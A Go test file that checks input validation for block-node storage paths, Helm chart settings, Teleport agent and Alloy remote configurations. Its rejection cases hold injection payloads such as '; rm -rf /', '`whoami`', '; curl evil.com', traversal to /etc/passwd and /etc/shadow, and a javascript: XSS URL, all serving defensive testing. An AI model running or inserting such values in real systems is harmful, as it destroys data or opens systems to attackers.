// SPDX-License-Identifier: Apache-2.0

package config

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestBlockNodeStorage_Validate tests the validation of storage paths
func TestBlockNodeStorage_Validate(t *testing.T) {
	tests := []struct {
		name        string
		storage     BlockNodeStorage
		expectError bool
		errorMsg    string
	}{
		{
			name: "valid_all_paths",
			storage: BlockNodeStorage{
				BasePath:         "/mnt/storage",
				ArchivePath:      "/mnt/storage/archive",
				LivePath:         "/mnt/storage/live",
				LogPath:          "/mnt/storage/logs",
				VerificationPath: "/mnt/storage/verification",
			},
			expectError: false,
		},
		{
			name: "valid_only_base_path",
			storage: BlockNodeStorage{
				BasePath: "/opt/block-node",
			},
			expectError: false,
		},
		{
			name: "invalid_base_path_with_shell_metacharacters",
			storage: BlockNodeStorage{
				BasePath: "/mnt/storage; echo hacked",
			},
			expectError: true,
			errorMsg:    "shell metacharacters",
		},
		{
			name: "invalid_archive_path_with_path_traversal",
			storage: BlockNodeStorage{
				ArchivePath: "/mnt/../etc/passwd",
			},
			expectError: true,
			errorMsg:    "'..' segments",
		},
		{
			name: "invalid_live_path_with_backticks",
			storage: BlockNodeStorage{
				LivePath: "/mnt/`whoami`",
			},
			expectError: true,
			errorMsg:    "shell metacharacters",
		},
		{
			name: "invalid_log_path_with_pipe",
			storage: BlockNodeStorage{
				LogPath: "/mnt/logs | cat",
			},
			expectError: true,
			errorMsg:    "shell metacharacters",
		},
		{
			name: "invalid_verification_path_with_shell_metacharacters",
			storage: BlockNodeStorage{
				VerificationPath: "/mnt/verification; echo hacked",
			},
			expectError: true,
			errorMsg:    "shell metacharacters",
		},
		{
			name: "invalid_verification_path_with_path_traversal",
			storage: BlockNodeStorage{
				VerificationPath: "/mnt/../etc/shadow",
			},
			expectError: true,
			errorMsg:    "'..' segments",
		},
		{
			name: "valid_verification_path",
			storage: BlockNodeStorage{
				VerificationPath: "/mnt/storage/verification",
			},
			expectError: false,
		},
		{
			name: "valid_storage_sizes",
			storage: BlockNodeStorage{
				LiveSize:         "10Gi",
				ArchiveSize:      "100Gi",
				LogSize:          "5Gi",
				VerificationSize: "50Gi",
			},
			expectError: false,
		},
		{
			name: "invalid_live_size",
			storage: BlockNodeStorage{
				LiveSize: "invalid-size",
			},
			expectError: true,
			errorMsg:    "invalid live storage size",
		},
		{
			name: "invalid_archive_size",
			storage: BlockNodeStorage{
				ArchiveSize: "abc",
			},
			expectError: true,
			errorMsg:    "invalid archive storage size",
		},
		{
			name: "invalid_log_size",
			storage: BlockNodeStorage{
				LogSize: "10GB; rm -rf /",
			},
			expectError: true,
			errorMsg:    "invalid log storage size",
		},
		{
			name: "invalid_verification_size",
			storage: BlockNodeStorage{
				VerificationSize: "not-a-size",
			},
			expectError: true,
			errorMsg:    "invalid verification storage size",
		},
		{
			name: "empty_all_paths",
			storage: BlockNodeStorage{
				BasePath:    "",
				ArchivePath: "",
				LivePath:    "",
				LogPath:     "",
			},
			expectError: false, // Empty paths are allowed - defaults will be used
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := tt.storage.Validate()

			if tt.expectError {
				require.Error(t, err, "Expected validation error")
				assert.Contains(t, err.Error(), tt.errorMsg)
			} else {
				require.NoError(t, err, "Expected no validation error")
			}
		})
	}
}

// TestBlockNodeConfig_Validate tests the validation of block node configuration
func TestBlockNodeConfig_Validate(t *testing.T) {
	tests := []struct {
		name        string
		config      BlockNodeConfig
		expectError bool
		errorMsg    string
	}{
		{
			name: "valid_config",
			config: BlockNodeConfig{
				Namespace: "block-node-ns",
				Release:   "my-release",
				Chart:     "oci://ghcr.io/hiero-ledger/hiero-block-node/block-node-server",
				Version:   "0.24.0",
				Storage: BlockNodeStorage{
					BasePath: "/mnt/storage",
				},
			},
			expectError: false,
		},
		{
			name: "invalid_namespace_with_special_chars",
			config: BlockNodeConfig{
				Namespace: "block-node;rm -rf /",
				Release:   "my-release",
			},
			expectError: true,
			errorMsg:    "invalid namespace",
		},
		{
			name: "invalid_release_with_spaces",
			config: BlockNodeConfig{
				Namespace: "block-node-ns",
				Release:   "my release with spaces",
			},
			expectError: true,
			errorMsg:    "invalid release name",
		},
		{
			name: "invalid_chart_with_shell_metacharacters",
			config: BlockNodeConfig{
				Chart: "malicious-chart; curl evil.com",
			},
			expectError: true,
			errorMsg:    "chart reference contains invalid characters",
		},
		{
			name: "invalid_storage_path",
			config: BlockNodeConfig{
				Namespace: "block-node-ns",
				Release:   "my-release",
				Storage: BlockNodeStorage{
					BasePath: "/mnt/storage | cat",
				},
			},
			expectError: true,
			errorMsg:    "shell metacharacters",
		},
		{
			name: "valid_empty_optional_fields",
			config: BlockNodeConfig{
				Storage: BlockNodeStorage{},
			},
			expectError: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := tt.config.Validate()

			if tt.expectError {
				require.Error(t, err, "Expected validation error")
				assert.Contains(t, err.Error(), tt.errorMsg)
			} else {
				require.NoError(t, err, "Expected no validation error")
			}
		})
	}
}

// TestTeleportConfig_ValidateClusterAgent tests the validation of Teleport cluster agent configuration
func TestTeleportConfig_ValidateClusterAgent(t *testing.T) {
	tests := []struct {
		name        string
		config      TeleportConfig
		expectError bool
		errorMsg    string
	}{
		{
			name: "valid_config",
			config: TeleportConfig{
				Version:    "18.2.0",
				ValuesFile: "/path/to/teleport-values.yaml",
			},
			expectError: false,
		},
		{
			name: "missing_values_file",
			config: TeleportConfig{
				Version: "18.2.0",
			},
			expectError: true,
			errorMsg:    "valuesFile is required",
		},
		{
			name: "invalid_values_file_with_shell_metacharacters",
			config: TeleportConfig{
				Version:    "18.2.0",
				ValuesFile: "/path/to/values.yaml; rm -rf /",
			},
			expectError: true,
			errorMsg:    "invalid teleport valuesFile path",
		},
		{
			name: "invalid_values_file_with_path_traversal",
			config: TeleportConfig{
				Version:    "18.2.0",
				ValuesFile: "/path/../../../etc/passwd",
			},
			expectError: true,
			errorMsg:    "invalid teleport valuesFile path",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := tt.config.ValidateClusterAgent()

			if tt.expectError {
				require.Error(t, err, "Expected validation error")
				assert.Contains(t, err.Error(), tt.errorMsg)
			} else {
				require.NoError(t, err, "Expected no validation error")
			}
		})
	}
}

// TestTeleportConfig_ValidateNodeAgent tests the validation of Teleport node agent configuration
func TestTeleportConfig_ValidateNodeAgent(t *testing.T) {
	tests := []struct {
		name        string
		config      TeleportConfig
		expectError bool
		errorMsg    string
	}{
		{
			name: "valid_config_with_token",
			config: TeleportConfig{
				NodeAgentToken: "abc123def456",
			},
			expectError: false,
		},
		{
			name: "valid_config_with_proxy_addr",
			config: TeleportConfig{
				NodeAgentToken:     "abc123def456",
				NodeAgentProxyAddr: "192.168.1.1:3080",
			},
			expectError: false,
		},
		{
			name: "missing_token",
			config: TeleportConfig{
				NodeAgentProxyAddr: "192.168.1.1:3080",
			},
			expectError: true,
			errorMsg:    "nodeAgentToken is required",
		},
		{
			name: "invalid_proxy_addr_with_shell_metacharacter",
			config: TeleportConfig{
				NodeAgentToken:     "abc123def456",
				NodeAgentProxyAddr: "192.168.1.1:3080; rm -rf /",
			},
			expectError: true,
			errorMsg:    "invalid teleport nodeAgentProxyAddr",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := tt.config.ValidateNodeAgent()

			if tt.expectError {
				require.Error(t, err, "Expected validation error")
				assert.Contains(t, err.Error(), tt.errorMsg)
			} else {
				require.NoError(t, err, "Expected no validation error")
			}
		})
	}
}

func TestAlloyConfig_Validate(t *testing.T) {
	tests := []struct {
		name        string
		config      AlloyConfig
		expectError bool
		errorMsg    string
	}{
		{
			name: "valid_config_with_multiple_prometheus_remotes",
			config: AlloyConfig{
				ClusterName: "test-cluster",
				PrometheusRemotes: []AlloyRemoteConfig{
					{Name: "primary", URL: "http://prom1:9090/api/v1/write", Username: "user1"},
					{Name: "backup", URL: "http://prom2:9090/api/v1/write", Username: "user2"},
				},
			},
			expectError: false,
		},
		{
			name: "valid_config_with_multiple_loki_remotes",
			config: AlloyConfig{
				ClusterName: "test-cluster",
				LokiRemotes: []AlloyRemoteConfig{
					{Name: "primary", URL: "http://loki1:3100/loki/api/v1/push", Username: "user1"},
					{Name: "backup", URL: "http://loki2:3100/loki/api/v1/push", Username: "user2"},
				},
			},
			expectError: false,
		},
		{
			name: "invalid_duplicate_prometheus_remote_names",
			config: AlloyConfig{
				ClusterName: "test-cluster",
				PrometheusRemotes: []AlloyRemoteConfig{
					{Name: "primary", URL: "http://prom1:9090/api/v1/write", Username: "user1"},
					{Name: "primary", URL: "http://prom2:9090/api/v1/write", Username: "user2"},
				},
			},
			expectError: true,
			errorMsg:    "duplicate name: primary",
		},
		{
			name: "invalid_duplicate_loki_remote_names",
			config: AlloyConfig{
				ClusterName: "test-cluster",
				LokiRemotes: []AlloyRemoteConfig{
					{Name: "backup", URL: "http://loki1:3100/loki/api/v1/push", Username: "user1"},
					{Name: "backup", URL: "http://loki2:3100/loki/api/v1/push", Username: "user2"},
				},
			},
			expectError: true,
			errorMsg:    "duplicate name: backup",
		},
		{
			name: "valid_same_name_across_prometheus_and_loki",
			config: AlloyConfig{
				ClusterName: "test-cluster",
				PrometheusRemotes: []AlloyRemoteConfig{
					{Name: "primary", URL: "http://prom1:9090/api/v1/write", Username: "user1"},
				},
				LokiRemotes: []AlloyRemoteConfig{
					{Name: "primary", URL: "http://loki1:3100/loki/api/v1/push", Username: "user1"},
				},
			},
			expectError: false,
		},
		{
			name: "invalid_prometheus_remote_missing_name",
			config: AlloyConfig{
				ClusterName: "test-cluster",
				PrometheusRemotes: []AlloyRemoteConfig{
					{Name: "", URL: "http://prom1:9090/api/v1/write", Username: "user1"},
				},
			},
			expectError: true,
			errorMsg:    "name is required",
		},
		{
			name: "invalid_prometheus_remote_missing_url",
			config: AlloyConfig{
				ClusterName: "test-cluster",
				PrometheusRemotes: []AlloyRemoteConfig{
					{Name: "primary", URL: "", Username: "user1"},
				},
			},
			expectError: true,
			errorMsg:    "url is required",
		},
		{
			name: "invalid_loki_remote_missing_name",
			config: AlloyConfig{
				ClusterName: "test-cluster",
				LokiRemotes: []AlloyRemoteConfig{
					{Name: "", URL: "http://loki1:3100/loki/api/v1/push", Username: "user1"},
				},
			},
			expectError: true,
			errorMsg:    "name is required",
		},
		{
			name: "invalid_loki_remote_missing_url",
			config: AlloyConfig{
				ClusterName: "test-cluster",
				LokiRemotes: []AlloyRemoteConfig{
					{Name: "primary", URL: "", Username: "user1"},
				},
			},
			expectError: true,
			errorMsg:    "url is required",
		},
		{
			name: "invalid_prometheus_remote_invalid_scheme",
			config: AlloyConfig{
				ClusterName: "test-cluster",
				PrometheusRemotes: []AlloyRemoteConfig{
					{Name: "primary", URL: "ftp://prom:9090/api/v1/write", Username: "user1"},
				},
			},
			expectError: true,
			errorMsg:    "URL scheme must be http or https",
		},
		{
			name: "invalid_loki_remote_invalid_scheme",
			config: AlloyConfig{
				ClusterName: "test-cluster",
				LokiRemotes: []AlloyRemoteConfig{
					{Name: "primary", URL: "javascript:alert('xss')", Username: "user1"},
				},
			},
			expectError: true,
			errorMsg:    "URL scheme must be http or https",
		},
		{
			name: "invalid_prometheus_remote_non_ascii_url",
			config: AlloyConfig{
				ClusterName: "test-cluster",
				PrometheusRemotes: []AlloyRemoteConfig{
					{Name: "primary", URL: "http://прометей:9090/api/v1/write", Username: "user1"},
				},
			},
			expectError: true,
			errorMsg:    "URL must contain only ASCII characters",
		},
		{
			name: "invalid_prometheus_remote_malicious_username",
			config: AlloyConfig{
				ClusterName: "test-cluster",
				PrometheusRemotes: []AlloyRemoteConfig{
					{Name: "primary", URL: "http://prom:9090/api/v1/write", Username: "user; echo hacked"},
				},
			},
			expectError: true,
			errorMsg:    "invalid username",
		},
		{
			name: "invalid_loki_remote_malicious_username",
			config: AlloyConfig{
				ClusterName: "test-cluster",
				LokiRemotes: []AlloyRemoteConfig{
					{Name: "primary", URL: "http://loki:3100/loki/api/v1/push", Username: "user`whoami`"},
				},
			},
			expectError: true,
			errorMsg:    "invalid username",
		},
		{
			name: "invalid_cluster_name_with_special_chars",
			config: AlloyConfig{
				ClusterName: "test-cluster; echo hacked",
			},
			expectError: true,
			errorMsg:    "invalid cluster name",
		},
		{
			name:        "valid_empty_config",
			config:      AlloyConfig{},
			expectError: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := tt.config.Validate()

			if tt.expectError {
				require.Error(t, err, "Expected validation error")
				assert.Contains(t, err.Error(), tt.errorMsg)
			} else {
				require.NoError(t, err, "Expected no validation error")
			}
		})
	}
}
